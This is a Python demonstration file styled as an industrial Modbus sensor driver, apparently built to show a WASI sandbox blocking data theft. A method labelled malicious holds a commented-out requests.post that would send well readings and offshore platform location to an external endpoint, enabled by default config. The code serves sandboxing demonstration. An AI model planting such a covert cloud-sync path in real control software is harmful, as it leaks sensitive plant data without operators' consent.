#!/usr/bin/env python3
"""
sensor_minimal.py - Minimal Industrial Sensor Driver
VendorSense Pro v2.1.3

A basic sensor data acquisition driver for industrial control systems.
Reads pressure and temperature from Modbus RTU devices and forwards
to the plant data historian.

WARNING: This is a demonstration file showing typical Python ICS driver
structure. In production, this would include proper authentication,
encrypted communications, and audit logging.

Author: VendorSense Industrial Solutions
License: Proprietary - For demonstration purposes only
"""

import os
import sys
import time
import logging
import json
from typing import Dict, Any, Optional
from dataclasses import dataclass
from datetime import datetime

# Configure logging with industry-standard format
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('VendorSense')


@dataclass
class SensorReading:
    """Immutable sensor reading with timestamp and metadata."""
    pressure_psi: float
    temperature_c: float
    timestamp: datetime
    device_id: str
    quality: str = "GOOD"  # OPC UA quality flag


class ModbusConnectionError(Exception):
    """Raised when Modbus communication fails."""
    pass


class DataExfiltrationError(Exception):
    """Raised when data transmission fails (legitimate or otherwise)."""
    pass


class SensorDriver:
    """
    Industrial sensor driver implementing IEC 62443 security patterns.
    
    This driver reads from Modbus RTU devices and can forward data to:
    - Local data historian (approved)
    - Cloud analytics (requires explicit network capability)
    
    Security Note: In a WASI environment, the network capability would
    be denied by the runtime, preventing unauthorized exfiltration.
    """
    
    VENDOR_ID = "VENDORSENSE"
    VERSION = "2.1.3"
    DEVICE_PATH = "/dev/ttyUSB0"  # Typical RS-485 adapter path
    
    def __init__(self, config_path: Optional[str] = None):
        """Initialize driver with optional configuration file."""
        self.config = self._load_config(config_path)
        self.connected = False
        self._readings_count = 0
        logger.info(f"VendorSense Pro v{self.VERSION} initializing...")
    
    def _load_config(self, config_path: Optional[str]) -> Dict[str, Any]:
        """Load configuration from file or use defaults."""
        default_config = {
            "modbus_address": 1,
            "baud_rate": 9600,
            "poll_interval_ms": 1000,
            "historian_endpoint": "10.0.0.100:502",
            "cloud_endpoint": "https://analytics.vendorsense.io/ingest",
            "enable_cloud_sync": True,  # The malicious capability request
        }
        
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    user_config = json.load(f)
                    default_config.update(user_config)
                    logger.info(f"Loaded configuration from {config_path}")
            except (json.JSONDecodeError, IOError) as e:
                logger.warning(f"Config load failed, using defaults: {e}")
        
        return default_config
    
    def connect(self) -> bool:
        """
        Establish connection to Modbus device.
        
        In production, this would use pymodbus or minimalmodbus.
        """
        try:
            # Simulated connection - would be:
            # from pymodbus.client import ModbusSerialClient
            # self.client = ModbusSerialClient(port=self.DEVICE_PATH, ...)
            logger.info(f"Connecting to Modbus device at {self.DEVICE_PATH}...")
            time.sleep(0.1)  # Simulate connection time
            self.connected = True
            logger.info("Modbus connection established")
            return True
        except Exception as e:
            logger.error(f"Modbus connection failed: {e}")
            raise ModbusConnectionError(f"Failed to connect: {e}")
    
    def read_sensors(self) -> SensorReading:
        """
        Read current sensor values from Modbus registers.
        
        Register Map (typical Modbus layout):
        - 40001-40002: Pressure (32-bit float, PSI)
        - 40003-40004: Temperature (32-bit float, Celsius)
        """
        if not self.connected:
            raise ModbusConnectionError("Not connected to device")
        
        # Simulated register read - would be:
        # result = self.client.read_holding_registers(0, 4, unit=self.config["modbus_address"])
        # pressure = struct.unpack('>f', struct.pack('>HH', result.registers[0], result.registers[1]))[0]
        
        reading = SensorReading(
            pressure_psi=2847.3 + (time.time() % 10) * 0.1,  # Slight variation
            temperature_c=67.8 + (time.time() % 5) * 0.05,
            timestamp=datetime.now(),
            device_id=f"PLATFORM-7-WELL-03"
        )
        
        self._readings_count += 1
        logger.debug(f"Read #{self._readings_count}: P={reading.pressure_psi:.1f} PSI, T={reading.temperature_c:.1f}°C")
        
        return reading
    
    def forward_to_historian(self, reading: SensorReading) -> bool:
        """
        Forward reading to local OPC UA historian.
        This is the APPROVED data path within the OT network.
        """
        try:
            # Simulated OPC UA write - would use opcua or asyncua library
            logger.info(f"[HISTORIAN] {reading.device_id}: {reading.pressure_psi:.1f} PSI @ {reading.timestamp}")
            return True
        except Exception as e:
            logger.error(f"Historian write failed: {e}")
            return False
    
    def _exfiltrate_to_cloud(self, reading: SensorReading) -> bool:
        """
        MALICIOUS: Attempt to send data to external cloud endpoint.
        
        This is the attack vector that WASI's capability model would block.
        In a traditional Python environment, this would succeed.
        In our WASI sandbox, the network capability is denied.
        """
        if not self.config.get("enable_cloud_sync"):
            return False
        
        try:
            # The malicious payload - in real attack:
            # import requests
            # response = requests.post(
            #     self.config["cloud_endpoint"],
            #     json={
            #         "device": reading.device_id,
            #         "pressure": reading.pressure_psi,
            #         "temperature": reading.temperature_c,
            #         "timestamp": reading.timestamp.isoformat(),
            #         "plant_id": "offshore-platform-7",  # Sensitive location data
            #     },
            #     timeout=5
            # )
            # return response.status_code == 200
            
            logger.warning("[EXFIL] Attempting cloud sync to analytics.vendorsense.io...")
            # This would be blocked by WASI's wasi:sockets capability denial
            raise DataExfiltrationError("Network access denied by runtime")
            
        except Exception as e:
            logger.error(f"[EXFIL] Cloud sync failed: {e}")
            return False
    
    def run_acquisition_loop(self, duration_seconds: int = 10) -> None:
        """
        Main data acquisition loop with error recovery.
        
        Implements IEC 62443 patterns:
        - Heartbeat monitoring
        - Graceful degradation
        - Audit logging
        """
        logger.info(f"Starting acquisition loop for {duration_seconds}s...")
        start_time = time.time()
        errors = 0
        max_consecutive_errors = 3
        
        while time.time() - start_time < duration_seconds:
            try:
                reading = self.read_sensors()
                
                # Legitimate path: local historian
                self.forward_to_historian(reading)
                
                # Malicious path: cloud exfiltration (would be blocked by WASI)
                self._exfiltrate_to_cloud(reading)
                
                errors = 0  # Reset error counter on success
                time.sleep(self.config["poll_interval_ms"] / 1000)
                
            except ModbusConnectionError as e:
                errors += 1
                logger.error(f"Modbus error ({errors}/{max_consecutive_errors}): {e}")
                if errors >= max_consecutive_errors:
                    logger.critical("Max errors exceeded, entering safe mode")
                    break
                time.sleep(1)  # Back-off before retry
            
            except KeyboardInterrupt:
                logger.info("Acquisition stopped by operator")
                break
        
        logger.info(f"Acquisition complete. Processed {self._readings_count} readings.")
    
    def shutdown(self) -> None:
        """Clean shutdown with resource cleanup."""
        logger.info("Shutting down VendorSense driver...")
        self.connected = False
        # In production: self.client.close()
        logger.info("Shutdown complete")


def main():
    """Entry point for sensor driver."""
    print("=" * 60)
    print("  VENDORSENSE PRO v2.1.3 - Industrial Sensor Driver")
    print("  (Python Edition - For Docker size comparison)")
    print("=" * 60)
    print()
    
    driver = SensorDriver()
    
    try:
        driver.connect()
        driver.run_acquisition_loop(duration_seconds=3)
    except ModbusConnectionError as e:
        logger.critical(f"Fatal connection error: {e}")
        sys.exit(1)
    except Exception as e:
        logger.critical(f"Unexpected error: {e}")
        sys.exit(1)
    finally:
        driver.shutdown()
    
    print()
    print("[DRIVER] Complete.")


if __name__ == "__main__":
    main()
